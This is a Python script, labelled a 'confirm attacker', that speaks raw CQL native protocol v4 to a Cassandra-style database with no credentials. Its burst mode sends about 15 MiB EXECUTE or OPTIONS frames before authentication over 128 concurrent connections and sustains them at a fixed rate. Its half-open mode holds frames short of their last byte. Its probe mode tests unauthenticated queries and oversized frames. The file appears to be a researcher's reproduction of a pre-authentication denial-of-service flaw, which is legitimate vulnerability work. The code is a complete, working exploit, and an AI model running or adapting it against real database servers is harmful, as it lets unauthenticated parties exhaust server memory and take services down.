#!/usr/bin/env python3
"""B9 3-b confirm attacker: NO credentials, raw protocol v4 frames over TCP, standard library only.
Frame F (15,728,684 B on the wire, body 15,728,675 B; stage 2's prepared INSERT was a 15,728,640-B blob + int pk):
  exec: EXECUTE (opcode 0x0A) with a random 16-byte statement id, CL ONE, values [int pk, 15,728,640 zero bytes],
        sent after STARTUP -> AUTHENTICATE (connection stage AUTHENTICATING, never answered).
  opt:  OPTIONS (0x05) with a zero body of the same length, sent before STARTUP (connection stage ESTABLISHED).
Modes
  burst  --mode exec|opt --conns 128 --per-src 8 --window 45 --rate 6
         every connection sets up, all wait on one barrier, BURST_START, each sends one F at once (stage 2's T burst),
         then each completion frees a permit and the next F waits on a shared 6/s limiter until window s after
         BURST_START (stage 2's sustain). Dead connections are reopened (and STARTUP re-sent) for the sustain phase.
  half   --mode exec|opt --conns N --per-src 8 --senders 32 --hold 120 [--complete]
         every connection sends F minus its last byte and then stays silent; HOLD_START when all are sent; per second the
         number of connections still open; with --complete the last byte is sent at the end and the replies counted.
  probe  single-connection checks of the code-reading claims (see code).
Source addresses: connection i binds 127.0.1.(i // per_src + 1)."""
import argparse, os, random, selectors, socket, struct, sys, threading, time
from cql4 import *

BLOB = 15728640


def mkframe(mode, stream=1):
    if mode == 'exec':
        body = execute_body(os.urandom(16), [struct.pack('>i', 7), bytes(BLOB)])
        return frame(OP['EXECUTE'], body, stream)
    body_len = len(execute_body(b'0' * 16, [b'0' * 4, b''])) + BLOB
    return frame(OP['OPTIONS'], bytes(body_len), stream)


def now_ms():
    return int(time.time() * 1000)


def src_of(i, per):
    return '127.0.1.%d' % (i // per + 1)


def setup(mode, i, per, timeout=60):
    s = sock(src=src_of(i, per), timeout=timeout)
    if mode == 'exec':
        s.sendall(frame(OP['STARTUP'], startup_body(), 0)); _, op, b = rd(s)
        if op != OP['AUTHENTICATE']:
            raise RuntimeError('STARTUP -> ' + describe(op, b))
    return s


class Stats:
    def __init__(s):
        s.lock = threading.Lock(); s.c = {}
    def inc(s, k, n=1):
        with s.lock:
            s.c[k] = s.c.get(k, 0) + n
    def snap(s):
        with s.lock:
            return dict(s.c)


def burst(a):
    F = mkframe(a.mode); print('frame bytes on wire', len(F), 'mode', a.mode, flush=True)
    st = Stats(); bar = threading.Barrier(a.conns + 1); lim_lock = threading.Lock(); nxt = [0.0]
    t_end = [None]; first = {}

    def limiter():
        with lim_lock:
            t = max(time.time(), nxt[0]); nxt[0] = t + 1.0 / a.rate
        d = t - time.time()
        if d > 0: time.sleep(d)

    def worker(i):
        s = None
        try:
            s = setup(a.mode, i, a.per_src); st.inc('setup_ok')
        except Exception as e:
            st.inc('setup_err'); print('setup_err', i, e, flush=True)
        try:
            bar.wait(120)
        except Exception:
            return
        k = 0
        while True:
            if k > 0:
                limiter()
                if time.time() >= t_end[0]: break
            k += 1
            try:
                if s is None:
                    s = setup(a.mode, i, a.per_src); st.inc('reconnect')
                t0 = time.time(); s.sendall(F); st.inc('sent'); t1 = time.time()
                _, op, b = rd(s); d = describe(op, b); t2 = time.time()
                key = 'resp:' + d.split(':')[0] + ':' + d.split(':')[1] if d.startswith('ERR') else 'resp:' + d
                st.inc(key)
                if k == 1:
                    first[i] = (int(t0 * 1000), int((t1 - t0) * 1000), int((t2 - t0) * 1000), d[:140])
            except Exception as e:
                st.inc('io:' + type(e).__name__)
                if k == 1:
                    first[i] = (int(time.time() * 1000), -1, -1, 'io:' + str(e)[:80])
                try: s.close()
                except Exception: pass
                s = None
                time.sleep(0.2)
            if time.time() >= t_end[0]: break
        if s is not None:
            try: s.close()
            except Exception: pass

    ths = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(a.conns)]
    for t in ths: t.start()
    t0 = time.time()
    while st.snap().get('setup_ok', 0) + st.snap().get('setup_err', 0) < a.conns and time.time() - t0 < 60:
        time.sleep(0.05)
    print('SETUP_DONE %d %s' % (now_ms(), st.snap()), flush=True)
    bs = time.time(); t_end[0] = bs + a.window
    bar.wait(120); print('BURST_START %d' % (bs * 1000), flush=True)
    while time.time() < t_end[0] + 5 and any(t.is_alive() for t in ths):
        time.sleep(1); print('%d +%.1f %s' % (now_ms(), time.time() - bs, st.snap()), flush=True)
    with open(os.path.join(a.out, 'first-responses.txt'), 'w') as f:
        f.write('# conn src t_send_ms send_ms resp_ms response\n')
        for i in sorted(first):
            f.write('%d %s %d %d %d %s\n' % ((i, src_of(i, a.per_src)) + first[i]))
    print('FINAL %d %s' % (now_ms(), st.snap()), flush=True)


def half(a):
    F = mkframe(a.mode); P = F[:-1]; print('frame bytes', len(F), 'sent per connection', len(P), 'mode', a.mode, flush=True)
    socks = [None] * a.conns; st = Stats(); idx = [0]; il = threading.Lock()

    def sender():
        while True:
            with il:
                i = idx[0]; idx[0] += 1
            if i >= a.conns: return
            try:
                s = setup(a.mode, i, a.per_src, timeout=120); s.sendall(P); socks[i] = s; st.inc('partial_sent')
            except Exception as e:
                st.inc('err:' + type(e).__name__)
                if st.snap().get('err:' + type(e).__name__, 0) <= 3: print('send_err', i, e, flush=True)

    t0 = time.time(); print('SEND_START %d' % (t0 * 1000), flush=True)
    ths = [threading.Thread(target=sender, daemon=True) for _ in range(a.senders)]
    for t in ths: t.start()
    while any(t.is_alive() for t in ths):
        time.sleep(1); print('%d +%.1f sending %s' % (now_ms(), time.time() - t0, st.snap()), flush=True)
    hs = time.time(); print('HOLD_START %d %s' % (hs * 1000, st.snap()), flush=True)
    sel = selectors.DefaultSelector(); open_ = set()
    for i, s in enumerate(socks):
        if s is not None:
            s.setblocking(False); sel.register(s, selectors.EVENT_READ, i); open_.add(i)
    unexpected = 0; last = 0
    while time.time() - hs < a.hold:
        for key, _ in sel.select(timeout=0.5):
            i = key.data
            try:
                d = key.fileobj.recv(65536)
            except Exception:
                d = b''
            if not d:
                sel.unregister(key.fileobj); open_.discard(i)
            else:
                unexpected += 1
        if time.time() - last >= 1:
            last = time.time(); print('%d +%.1f open %d closed %d unexpected_bytes_events %d' % (now_ms(), last - hs, len(open_), a.conns - len(open_), unexpected), flush=True)
        if not open_:
            print('ALL_CLOSED %d' % now_ms(), flush=True); break
    if a.complete and open_:
        res = {}
        for i in sorted(open_):
            s = socks[i]
            try:
                sel.unregister(s); s.setblocking(True); s.settimeout(30); s.sendall(F[-1:]); _, op, b = rd(s); d = describe(op, b)[:120]
            except Exception as e:
                d = 'io:' + type(e).__name__
            res[d] = res.get(d, 0) + 1
        print('COMPLETE %d %s' % (now_ms(), res), flush=True)
    for s in socks:
        if s is not None:
            try: s.close()
            except Exception: pass
    print('FINAL %d open_at_end %d' % (now_ms(), len(open_)), flush=True)


def probe(a):
    out = []
    def P(*x):
        line = ' '.join(str(y) for y in x); print(line, flush=True); out.append(line)
    # p1: pre-STARTUP OPTIONS with a 15 MiB body
    F = mkframe('opt'); s = sock(src='127.0.1.1', timeout=30); t0 = time.time(); s.sendall(F); _, op, b = rd(s)
    P('p1 pre-STARTUP OPTIONS body %d B ->' % (len(F) - 9), describe(op, b), '%.0f ms' % ((time.time() - t0) * 1000))
    s.sendall(frame(OP['OPTIONS'], b'', 2)); _, op, b = rd(s); P('p1 same connection, small OPTIONS ->', describe(op, b), '(connection still open)')
    s.sendall(frame(OP['STARTUP'], startup_body(), 3)); _, op, b = rd(s); P('p1 same connection, STARTUP ->', describe(op, b))
    s.close()
    # p2: after STARTUP -> AUTHENTICATE, a 15 MiB EXECUTE with a random id
    F = mkframe('exec'); s = setup('exec', 0, 8); P('p2 STARTUP -> AUTHENTICATE ok')
    t0 = time.time(); s.sendall(F); _, op, b = rd(s); P('p2 pre-auth EXECUTE body %d B ->' % (len(F) - 9), describe(op, b), '%.0f ms' % ((time.time() - t0) * 1000))
    try:
        s.sendall(frame(OP['OPTIONS'], b'', 5)); _, op, b = rd(s); P('p2 same connection, OPTIONS ->', describe(op, b))
        s.sendall(F); _, op, b = rd(s); P('p2 same connection, second 15 MiB EXECUTE ->', describe(op, b))
    except Exception as e:
        P('p2 connection after refusal: io', type(e).__name__, e)
    s.close()
    # p3: QUERY without login
    s = setup('exec', 0, 8); s.sendall(frame(OP['QUERY'], query_body('SELECT * FROM vks.kv'), 1)); _, op, b = rd(s)
    P('p3 pre-auth QUERY SELECT * FROM vks.kv ->', describe(op, b)); s.close()
    # p4: v4 frame larger than native_transport_max_frame_size (16 MiB): header only, then see what happens
    s = setup('exec', 0, 8); hdr = struct.pack('>BBhBi', 4, 0, 9, OP['EXECUTE'], 16 * 1024 * 1024 + 100)
    s.sendall(hdr + bytes(1 << 20))
    try:
        s.settimeout(5); _, op, b = rd(s); P('p4 pre-auth 16 MiB+100 B frame (1 MiB sent) ->', describe(op, b))
    except Exception as e:
        P('p4 pre-auth 16 MiB+100 B frame (1 MiB sent) -> no reply within 5 s / io', type(e).__name__)
    s.close()
    with open(os.path.join(a.out, 'probe.txt'), 'w') as f:
        f.write('\n'.join(out) + '\n')


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('cmd', choices=['burst', 'half', 'probe'])
    ap.add_argument('--mode', default='exec', choices=['exec', 'opt'])
    ap.add_argument('--conns', type=int, default=128); ap.add_argument('--per-src', type=int, default=8)
    ap.add_argument('--window', type=float, default=45); ap.add_argument('--rate', type=float, default=6)
    ap.add_argument('--senders', type=int, default=32); ap.add_argument('--hold', type=float, default=120)
    ap.add_argument('--complete', action='store_true'); ap.add_argument('--out', default='.')
    a = ap.parse_args()
    print('ATTACK %s pid=%d argv=%s start=%d' % (a.cmd, os.getpid(), sys.argv[1:], now_ms()), flush=True)
    {'burst': burst, 'half': half, 'probe': probe}[a.cmd](a)


if __name__ == '__main__':
    main()
